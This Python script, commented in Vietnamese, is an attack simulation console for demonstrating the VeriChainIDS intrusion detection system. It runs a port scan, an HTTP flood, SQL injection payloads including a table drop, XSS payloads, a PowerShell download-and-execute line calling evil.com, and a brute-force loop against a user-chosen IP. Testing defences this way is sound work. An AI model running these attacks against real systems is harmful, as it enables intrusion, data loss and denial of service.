#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
   VERICHAIN IDS - ATTACK SIMULATION TOOLKIT (DÀNH CHO MÁY PC ATTACKER)
================================================================================
Công cụ mô phỏng tấn công mạng để demo giải pháp Giám sát & Phòng thủ VeriChainIDS.
Chạy từ máy PC của bạn tấn công vào VPS 2 (Victim Server).
================================================================================
"""

import sys
import time
import socket
import urllib.request
import urllib.error
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

# Màu sắc console ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"

def get_public_ip():
    """Lấy IP Public của máy PC hiện tại"""
    try:
        req = urllib.request.Request("https://api.ipify.org", headers={"User-Agent": "curl/7.68.0"})
        with urllib.request.urlopen(req, timeout=3) as resp:
            return resp.read().decode("utf-8").strip()
    except Exception:
        try:
            req = urllib.request.Request("https://icanhazip.com", headers={"User-Agent": "curl/7.68.0"})
            with urllib.request.urlopen(req, timeout=3) as resp:
                return resp.read().decode("utf-8").strip()
        except Exception:
            return "Không xác định (Kiểm tra kết nối Internet)"

def print_banner(my_ip):
    print(f"""{RED}{BOLD}
╔══════════════════════════════════════════════════════════════════════╗
║        VERICHAIN IDS - ATTACK SIMULATION CONSOLE (DEMO TOOL)         ║
╚══════════════════════════════════════════════════════════════════════╝{RESET}
  {CYAN}👤 Máy Attacker (PC của bạn):{RESET} {WHITE}{BOLD}{my_ip}{RESET}
  {YELLOW}🎯 Mục tiêu:{RESET} VPS 2 (Nơi cài đặt VeriChainIDS Agent)
  {GREEN}🛡️  Mục đích:{RESET} Demo khả năng phát hiện & kích hoạt Auto-Block của Agent
{"="*72}""")

# ─────────────────────────────────────────────────────────────────────────────
# 1. PORT SCAN
# ─────────────────────────────────────────────────────────────────────────────
def attack_port_scan(target_ip):
    print(f"\n{YELLOW}[+] Đang bắt đầu Port Scan vào {target_ip}...{RESET}")
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 2222, 3306, 3389, 5432, 6379, 8080, 8443, 8888, 9999]
    open_ports = []
    
    def scan_port(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.6)
            res = s.connect_ex((target_ip, p))
            s.close()
            if res == 0:
                print(f"  {GREEN}[OPEN]{RESET} Cổng {p} đang mở!")
                open_ports.append(p)
            else:
                print(f"  {WHITE}[SCAN]{RESET} Cổng {p} đóng/lọc.", end="\r")
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(scan_port, ports)
        
    print(f"\n{GREEN}[✓] Quét hoàn tất {len(ports)} cổng. Cổng mở: {open_ports if open_ports else 'Không có'}{RESET}")
    print(f"{CYAN}[i] Hành vi này sẽ kích hoạt cảnh báo 'PortScan' trên VeriChainIDS.{RESET}\n")

# ─────────────────────────────────────────────────────────────────────────────
# 2. HTTP / DDOS FLOOD
# ─────────────────────────────────────────────────────────────────────────────
def attack_http_flood(target_ip, port=8080, count=400):
    print(f"\n{RED}[!] Đang khởi động HTTP Flood ({count} requests) tới http://{target_ip}:{port}...{RESET}")
    url = f"http://{target_ip}:{port}/"
    success = 0
    blocked = 0

    def send_req(i):
        nonlocal success, blocked
        try:
            req = urllib.request.Request(
                f"{url}?burst={i}&t={time.time()}", 
                headers={"User-Agent": "VeriChain-Stress-Bot/1.0"}
            )
            with urllib.request.urlopen(req, timeout=1.5) as resp:
                if resp.status == 200:
                    success += 1
        except urllib.error.URLError as e:
            blocked += 1
        except Exception:
            blocked += 1

    start_time = time.time()
    with ThreadPoolExecutor(max_workers=25) as executor:
        executor.map(send_req, range(count))
    duration = time.time() - start_time

    print(f"{GREEN}[✓] Đã gửi {count} requests trong {duration:.2f}s.{RESET}")
    print(f"  - Thành công: {success}")
    print(f"  - Bị lỗi / Chặn (Blocked): {blocked}")
    if blocked > 50:
        print(f"{RED}{BOLD}[🔥] CÓ DẤU HIỆU ĐÃ BỊ CHẶN! Agent trên VPS 2 đã drop kết nối từ IP của bạn!{RESET}")
    print(f"{CYAN}[i] Hành vi này sẽ kích hoạt cảnh báo 'DDoS' (Critical) và Auto-Block.{RESET}\n")

# ─────────────────────────────────────────────────────────────────────────────
# 3. SQL INJECTION PROBES
# ─────────────────────────────────────────────────────────────────────────────
def attack_sqli(target_ip, port=8080):
    print(f"\n{YELLOW}[+] Đang gửi các mẫu tấn công SQL Injection tới http://{target_ip}:{port}/search...{RESET}")
    payloads = [
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT 1, 2, @@version, user() --",
        "1; DROP TABLE users; --",
        "' WAITFOR DELAY '0:0:5' --",
        "1' AND 1=CONVERT(int, (SELECT @@version)) --",
        "1' OR SLEEP(5)#",
        "' UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables --"
    ]

    for p in payloads:
        encoded = urllib.parse.quote(p)
        url = f"http://{target_ip}:{port}/search?query={encoded}"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "sqlmap/1.7#dev"})
            with urllib.request.urlopen(req, timeout=2) as resp:
                print(f"  {RED}[SQLi Sent]{RESET} Payload: {WHITE}{p}{RESET} -> Status {resp.status}")
        except Exception as e:
            print(f"  {RED}[SQLi Drop]{RESET} Payload: {WHITE}{p}{RESET} -> {e}")
        time.sleep(0.3)

    print(f"\n{GREEN}[✓] Hoàn tất gửi 8 mẫu SQL Injection.{RESET}")
    print(f"{CYAN}[i] Agent & AI Engine sẽ gắn nhãn tấn công 'SQLInjection' (High Severity).{RESET}\n")

# ─────────────────────────────────────────────────────────────────────────────
# 4. XSS & PAYLOAD EXPLOIT
# ─────────────────────────────────────────────────────────────────────────────
def attack_xss(target_ip, port=8080):
    print(f"\n{YELLOW}[+] Đang gửi các mẫu Cross-Site Scripting (XSS) & Exploit...{RESET}")
    payloads = [
        "<script>document.cookie</script>",
        "<img src=x onerror=alert('XSS_BY_ATTACKER')>",
        "<iframe src='javascript:alert(1)'>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*///0-1/error=alert(1)>",
        "<svg onload=alert(document.domain)>",
        "powershell -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')"
    ]

    for p in payloads:
        data = urllib.parse.urlencode({"comment": p, "author": "Hacker"}).encode("utf-8")
        url = f"http://{target_ip}:{port}/api/comment"
        try:
            req = urllib.request.Request(url, data=data, headers={"User-Agent": "Mozilla/5.0 (Exploit)"})
            with urllib.request.urlopen(req, timeout=2) as resp:
                print(f"  {PURPLE}[XSS Sent]{RESET} Payload: {WHITE}{p[:45]}...{RESET} -> Status {resp.status}")
        except Exception as e:
            print(f"  {PURPLE}[XSS Sent]{RESET} Payload: {WHITE}{p[:45]}...{RESET} -> {e}")
        time.sleep(0.3)

    print(f"\n{GREEN}[✓] Đã gửi các mẫu XSS và Suspicious Command.{RESET}")
    print(f"{CYAN}[i] Agent sẽ gắn nhãn 'XSS' / 'Malware' cho đợt lưu lượng này.{RESET}\n")

# ─────────────────────────────────────────────────────────────────────────────
# 5. SSH / BRUTE FORCE
# ─────────────────────────────────────────────────────────────────────────────
def attack_bruteforce(target_ip, port=2222, attempts=20):
    print(f"\n{RED}[!] Đang mô phỏng Brute Force Credential (Cổng {port}) với {attempts} lần thử...{RESET}")
    success = 0
    for i in range(1, attempts + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((target_ip, port))
            # Gửi fake SSH banner / auth packet
            s.sendall(f"SSH-2.0-Putty_Release_0.76\r\nUSER admin PASS pass{i}\r\n".encode())
            s.close()
            success += 1
            print(f"  {YELLOW}[AUTH ATTEMPT {i:02d}]{RESET} Thử user: root/admin | pass: 123456_{i}", end="\r")
        except Exception:
            print(f"\n  {RED}[CONNECT REFUSED/DROPPED]{RESET} Không thể kết nối cổng {port}! Có thể IP đã bị Firewall chặn!")
            break
        time.sleep(0.15)

    print(f"\n{GREEN}[✓] Hoàn tất chuỗi {success}/{attempts} kết nối thử nghiệm.{RESET}")
    print(f"{CYAN}[i] Agent sẽ phát hiện 'BruteForce_SSH' do tần suất kết nối auth cao.{RESET}\n")

# ─────────────────────────────────────────────────────────────────────────────
# 6. TEST KẾT NỐI & KIỂM TRA BLOCK
# ─────────────────────────────────────────────────────────────────────────────
def check_connection_status(target_ip, port=8080):
    print(f"\n{CYAN}[?] Đang kiểm tra khả năng kết nối tới VPS 2 ({target_ip}:{port})...{RESET}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.5)
        start = time.time()
        res = s.connect_ex((target_ip, port))
        latency = (time.time() - start) * 1000
        s.close()

        if res == 0:
            print(f"  {GREEN}{BOLD}[STATUS: ONLINE / UNBLOCKED]{RESET} Kết nối bình thường! (Độ trễ: {latency:.1f}ms)")
            print(f"  {WHITE}-> IP của bạn hiện CHƯA bị VPS 2 chặn.{RESET}")
        else:
            print(f"  {RED}{BOLD}[STATUS: BLOCKED / TIMEOUT]{RESET} Không thể kết nối tới {target_ip}!")
            print(f"  {RED}-> XÁC NHẬN: VeriChainIDS Agent đã TỰ ĐỘNG CHẶN IP CỦA BẠN (Auto-Block Firewall)!{RESET}")
    except Exception as e:
        print(f"  {RED}[STATUS: ERROR]{RESET} {e}")
    print()

# ─────────────────────────────────────────────────────────────────────────────
# MAIN MENU
# ─────────────────────────────────────────────────────────────────────────────
def main():
    my_ip = get_public_ip()
    print_banner(my_ip)

    default_target = "127.0.0.1"
    target_ip = input(f"{BOLD}Nhập địa chỉ IP của VPS 2 (Victim Server) [{default_target}]: {RESET}").strip()
    if not target_ip:
        target_ip = default_target

    target_port = 8080
    port_input = input(f"{BOLD}Nhập cổng Web của VPS 2 [{target_port}]: {RESET}").strip()
    if port_input.isdigit():
        target_port = int(port_input)

    while True:
        print(f"""
{BOLD}=================== BẢNG ĐIỀU KHIỂN TẤN CÔNG DEMO ==================={RESET}
  {CYAN}Mục tiêu hiện tại:{RESET} {WHITE}{BOLD}{target_ip}:{target_port}{RESET} | {CYAN}IP của bạn:{RESET} {WHITE}{my_ip}{RESET}

  {BOLD}[1]{RESET} ⚡ {YELLOW}Port Scanning Attack{RESET} (Quét 22 cổng dịch vụ)
  {BOLD}[2]{RESET} 🌊 {RED}HTTP / DDoS Flood Attack{RESET} (Bắn dồn dập 400 requests)
  {BOLD}[3]{RESET} 💉 {MAGENTA if 'MAGENTA' in globals() else YELLOW}SQL Injection Probes{RESET} (Gửi 8 payload SQLi nâng cao)
  {BOLD}[4]{RESET} 👾 {PURPLE}XSS & Suspicious Payload{RESET} (Gửi script độc hại)
  {BOLD}[5]{RESET} 🔐 {BLUE}SSH / Auth Brute Force{RESET} (Dò mật khẩu liên tục cổng 22/2222)
  {BOLD}[6]{RESET} 💥 {RED}{BOLD}COMBO ALL-IN-ONE (Kịch bản biểu diễn tổng thể){RESET}
  {BOLD}[7]{RESET} 🔍 {GREEN}Kiểm tra kết nối / Xem IP đã bị chặn chưa?{RESET}
  {BOLD}[8]{RESET} ⚙️  Đổi IP mục tiêu (VPS 2)
  {BOLD}[0]{RESET} 🚪 Thoát
{"="*68}""")
        choice = input(f"{BOLD}Chọn chế độ [0-8]: {RESET}").strip()

        if choice == "1":
            attack_port_scan(target_ip)
        elif choice == "2":
            attack_http_flood(target_ip, target_port)
        elif choice == "3":
            attack_sqli(target_ip, target_port)
        elif choice == "4":
            attack_xss(target_ip, target_port)
        elif choice == "5":
            ssh_port = 2222
            sp_in = input(f"Nhập port SSH để test brute force [{ssh_port}]: ").strip()
            if sp_in.isdigit():
                ssh_port = int(sp_in)
            attack_bruteforce(target_ip, ssh_port)
        elif choice == "6":
            print(f"\n{RED}{BOLD}=== BẮT ĐẦU KỊCH BẢN DEMO TỔNG HỢP TOÀN DIỆN ==={RESET}")
            print(f"{CYAN}Bước 1: Trinh sát & Quét cổng...{RESET}")
            attack_port_scan(target_ip)
            time.sleep(2)
            print(f"{CYAN}Bước 2: Khai thác lỗ hổng Web (SQLi + XSS)...{RESET}")
            attack_sqli(target_ip, target_port)
            attack_xss(target_ip, target_port)
            time.sleep(2)
            print(f"{CYAN}Bước 3: Tấn công từ chối dịch vụ DDoS Flood...{RESET}")
            attack_http_flood(target_ip, target_port, count=450)
            time.sleep(2)
            print(f"{CYAN}Bước 4: Kiểm tra xem IP của bạn đã bị Agent trên VPS 2 chặn chưa...{RESET}")
            check_connection_status(target_ip, target_port)
        elif choice == "7":
            check_connection_status(target_ip, target_port)
        elif choice == "8":
            new_ip = input("Nhập IP VPS 2 mới: ").strip()
            if new_ip:
                target_ip = new_ip
        elif choice == "0":
            print("\nĐã thoát. Chúc bạn có buổi demo thành công!\n")
            break
        else:
            print("Lựa chọn không hợp lệ, vui lòng chọn lại.")

if __name__ == "__main__":
    main()
